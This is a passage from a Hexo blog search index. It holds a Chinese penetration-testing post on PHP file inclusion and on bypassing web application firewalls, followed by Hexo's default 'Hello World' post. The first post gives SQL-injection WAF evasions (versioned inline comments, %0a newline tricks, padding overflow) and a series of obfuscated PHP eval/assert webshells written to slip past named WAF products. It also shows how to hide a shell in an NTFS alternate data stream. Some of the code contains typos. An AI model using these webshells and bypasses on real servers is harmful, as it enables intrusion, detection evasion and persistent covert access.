php文件被执行之前，php解析器会被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最后按新的php文件执行代码程序。</p><p>使用include_once会在导入文件前检测该文件是否在该页面的其他部分被应用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）</p><p>require_once语句是require语句的延伸，它的功能与require语句基本一只，不同的是，在应用require_once时，先会检查要引用的文件是不是已经在该程序中的其他地方被引用过，如果有，则不会再重复调用该文件。（同时使用require_once语句在同一页面中引用了两个不同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p><br><p>PHP默认不能包含远程文件，需要开启allow_url_include = On</p><p>在php的配置文件php_ini中可以修改这个，之后就可以在目标服务器上，例：</p><pre><code>&lt;?php require('http://一个公网ip/要包含的文件')?&gt;</code></pre><h2 id="饶WAF（上）"><a href="#饶WAF（上）" class="headerlink" title="饶WAF（上）"></a>饶WAF（上）</h2><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>介绍Bypass之前，我们先介绍一下什么事WAF</p><p>WAF是一个缩写，他的全名叫做web应用防护系统（web Application Firewall）是通过执行一系列针对HTTP/HTTPS的安全策略来专门为web应用提供保护的一款产品。</p><p>WAF有硬件类型的也有软件类型的，但是其实在我看看来，从绕过WAF机制上来说，区别不大。我们一般渗透测试都会遇到软WAF，应为硬件WAF价格有点昂贵，正常企业不会购买，所以基本上是GOV站点或者国网、运营商等国企才会大规模装配。</p><p>来看看常见的软WAF，常见：安全狗、云锁、悬镜、护卫神、云盾</p><h3 id="Bypass是什么？"><a href="#Bypass是什么？" class="headerlink" title="Bypass是什么？"></a>Bypass是什么？</h3><p>Bypass他就是绕过的意思，我们渗透测试人员通过特殊语句的构建进行渗透测试，然后达到绕过WAF的手法</p><p>WAF检测机制其实很简单，核心就是正则匹配，虽然说还有字符串强行匹配，还有什么语义解析，但是实际上还是正则居多。</p><h3 id="常见饶WAF手法"><a href="#常见饶WAF手法" class="headerlink" title="常见饶WAF手法"></a>常见饶WAF手法</h3><p>记住一句话，安全和客户体验都是需要平衡的，特别是对于WAF而言，你想想，用了WAF之后，然后网页动不动就拦截，比如我是用户，然后因为我用户名叫and然后我被拉黑了，因为我不小心输了个’页面就出问题，这个当然不可以，所以WAF一般都是通用的，并不是单独定制的，既然是通用的，那么他在拦截上会比较谨慎，所以WAF的正则一般是搭配式的。</p><p>我们既然知道WAF通过正则匹配，那么你们第一反应就是，替换函数对不对</p><p>例如：id=1 and 1=1</p><p>WAF对and进行了拦截，那么我们是不是得尝试找到替换and的东西，那么运算符就能榜上我们，例如：&amp;</p><p>但是输入时候我们发现如果只写and是不会被拦截的，那么我们想办法改一改1=1，可以试试-1=-1</p><p>甚至例如直接传参，我使用加减符号，乘除符号运算，或者是字符串传参直接用16进制也可以绕过这个傻狗</p><h4 id="在这里要讲一个东西叫做内联注入。"><a href="#在这里要讲一个东西叫做内联注入。" class="headerlink" title="在这里要讲一个东西叫做内联注入。"></a>在这里要讲一个东西叫做内联注入。</h4><p>内联注入是MySQL为了保持与其它数据兼容，将MySQL中特有的语句放在/*!…*/中，这些语句在不兼容的数据库中不执行，而在MySQL自身却能识别，执行。</p><p>/*!50001*/表示数据库版本=&gt;5.00.01时中间的语句才能被执行。</p><p>在url栏中特殊符号有自己特殊的含义，&amp;就代表连接传参的</p><p>将&amp; url编码再输入就代表数据库中的与运算了，也可以用十六进制0x来试下</p><p>例：id=0x31</p><p>可以不用order by直接union select</p><p>饶WAF支持的编码不多</p><p>拦截了union select 就试一下union all select</p><p>还被拦截就用内联注释</p><br><p>/**/：在数据库中代表注释</p><p>/*!*/：是内联注释，内联注释里的SQL语句都会被执行。</p><p>当内联注释union slect /*!select*/也被拦截了，就可以尝试加上版本号，如50001</p><pre><code>union /*!50001select*/</code></pre><p>代表数据库版本为5.00.01时执行</p><p>若还被拦截可以尝试下其他的版本号，如5000，当版本号不存在的时候，虽然不拦截了，但是SQl语句也执行不了，所以爆破版本号是可以的</p><h3 id="常见饶WAF手段"><a href="#常见饶WAF手段" class="headerlink" title="常见饶WAF手段"></a>常见饶WAF手段</h3><p>大小写绕过（很老的WAF才有用）</p><p>替换饶过（很老的WAF才有用）【和上传文件那个pphphp一样】</p><p>特殊字符让过（%0a换行）</p><pre><code>-- qwe/*%0afrom admin %23*/</code></pre><p>%23代表“#”</p><p>因为%0a代表换行，– qwe相当于注释掉/<em>，%23相当于注释掉了\</em>/</p><p>所以安全狗会认为/**/注释里面的东西是安全的</p><p>编码绕过（比如会多次编码的东西）</p><p>等价替换（利用其它函数替代）【union #%0aselect拦截】【union all#0aseelct不拦截】</p><p>容器特性（例如Apace的Hpp，或者是IIS的%分割）</p><p>在IIS里，s%e%l%e%c%t与select是等价的</p><p>Apace里的H匹配是参数污染</p><p>白名单（管理员权限或者是127.0.0.1本地访问不拦截）</p><p>缓冲区（数据太多，超过了WAF检测的范围）【填充大量字符来溢出，例如填入大量注释内容，俺去昂狗大约二四千多个字符就能绕过】</p><h2 id="饶WAF（下）"><a href="#饶WAF（下）" class="headerlink" title="饶WAF（下）"></a>饶WAF（下）</h2><h3 id="WAF检测机制"><a href="#WAF检测机制" class="headerlink" title="WAF检测机制"></a>WAF检测机制</h3><p>这里我们开始讲Webshell小马的绕过。</p><p>我们最常见的PHP一句话木马那就是</p><pre><code>&lt;?php eval($_REQUEST['a']);?&gt;</code></pre><p>这个就是密码是a的一句话木马，这个语句肯定会被拦截的，那么有没有思考过是怎么拦截的呢？</p><p>关于拦截其实最主要的还是测试，看看Waf究竟怎么拦截。[最直接的检测应该就是正则匹配]</p><p>我们尝试只写&lt;?php eval();?&gt;发现没有拦截，但是加了$_REQUEST[‘a’]就拦截了，那么我们是不是可以尝试检测看看究竟拦截$_REQUEST[‘a’]的那个部分。</p><p>然后测试发现，他拦截的是$_REQUEST[，那么我们只要不出现中括号就可以解决对吗？或者我们尝试把这个变量换一个就可以解决。</p><p>例如：</p><pre><code>&lt;?php eval(end($_REQUEST));?&gt;</code></pre><p>这个语句就没有出现$_REQUEST[，所以陈宫过狗，我们用end来代替了[]，但是它唯一不好的就是他没有密码，即传参名，所以用什么当密码都行。</p><p>end函数的意义：输出数组中的当前元素和最后一个元素的值，然后因为我的传参就一个。</p><h3 id="常见绕过手法"><a href="#常见绕过手法" class="headerlink" title="常见绕过手法"></a>常见绕过手法</h3><p>通过常量定义：</p><pre><code>&lt;?php define("a","$_GET[1]");eval(a);?&gt;</code></pre><p>通过字符串你拼接+双美元符号：</p><pre><code>&lt;?php    $a='ass';    $b='ert';    $funcName=$a.$b;    $x='funcName';    $$x($_REQUEST[1]);?&gt;</code></pre><p>通过函数定义强行分割：</p><pre><code>&lt;?php    function a($a){    return $a    };    eval(a($_POST)['a']);    //强行分割$_POST['a']?&gt;</code></pre><p>通过类定义，然后传参强行分割</p><pre><code>&lt;?phpclass User{  Public $name='';  function destruct(){    eval("$this-&gt;name");  }}$user=new User;$user-&gt;name=''.$_POST['dd'];?&gt;</code></pre><p>多方式传参免杀：</p><pre><code>&lt;?php$COOKIE=$_COOKIE;foreach($COOKIE as $key=&gt;$value){    if($key=='assert'){        $key($POST['s'];)    }}?&gt;</code></pre><pre><code>&lt;?php$a=get_defined_funcitons();$a['internal'][841]($_GET['a']);?&gt;</code></pre><p>键值842代表assert，可以用var_dump查看</p><br><p>用前面的end再加上 if就能绕过D盾</p><pre><code>&lt;?php    if($_SERVER['HTTP_USER_AGENT']==='1'){        eval(eend($_REQUEST));    }?&gt;</code></pre><br><p>拿到shell之后藏shell的妙招：ntfs文件流</p><pre><code>echo "&lt;?php eval($_REQUEST['a']?&gt;" &gt;&gt; /:123.txt</code></pre><p>此时会生成一个123.txt文件，但是不会显示</p><p>再创建另个一个PHP文件，内容为</p><pre><code>&lt;?php include('/:123.txt');?&gt;</code></pre><br><p>绕过市面上所有的WAF（终极手法）</p><pre><code>&lt;?php    eval(mysql_fetch_assoc(mysqli_query(mysqli_connect('127.0.0.1','root','root','maoshe'),'select * from info'))['info']);?&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/07/24/hello-word/"/>
      <url>/2020/07/24/hello-word/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
